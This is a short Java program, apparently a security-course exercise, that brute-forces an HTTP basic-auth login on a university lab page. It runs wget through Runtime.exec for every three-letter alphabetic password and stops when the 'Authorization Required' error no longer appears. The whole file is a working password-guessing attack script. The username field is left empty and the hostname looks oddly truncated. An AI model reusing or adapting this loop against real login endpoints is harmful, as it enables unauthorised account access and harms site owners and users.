
import java.io.*;
import java.awt.*;
import java.net.*;

public class BruteForce
{
	public static void main (String[] args)
	{
		String pw = new String();
		pw = getPassword ();
		System.out.println("Password is: "+pw);
	}
	public static String getPassword()
	{
		String passWord = new String();
		passWord = "AAA";
		char[] guess = passWord.toCharArray();
		Process pro = null;
		Runtime runtime = Runtime.getRuntime();
		BufferedReader in = null;
		String str=null;
		boolean found = true;

		System.out.println(" attacking.....");
		for (int i=65;i<=122 ;i++ )
		{
			guess[0]=(char)(i);
            for (int j=65;j<=122 ;j++ )
			{
				guess[1]=(char)(j);
                for (int k=65 ;k<=122 ;k++ )
				{
					guess[2]=(char)(k);
					passWord = new String(guess);
					String cmd = "wget --http-user= --http-passwd="+passWord +" http://sec-crack.cs.rmit.edu./SEC/2/index.php ";
					try
					{
						pro = runtime.exec(cmd);

						in = new BufferedReader(new InputStreamReader(pro.getErrorStream()));
						found = true;
						if((str=in.readLine())!=null)
						{
							while ((str=in.readLine())!=null)
							{
								if (str.endsWith("Required"))
								{
									found = false;
								}
							}
							if (found == true)
							{
								return passWord;
							}
						}
					}
					catch (Exception exception)
					{
					    exception.getMessage();
					}
					if(k==90)
						k=96;
					runtime.gc();
				}
				if(j==90)
					j=96;
			}
			if(i==90)
				i=96;
		}
		return "not found";
	}
}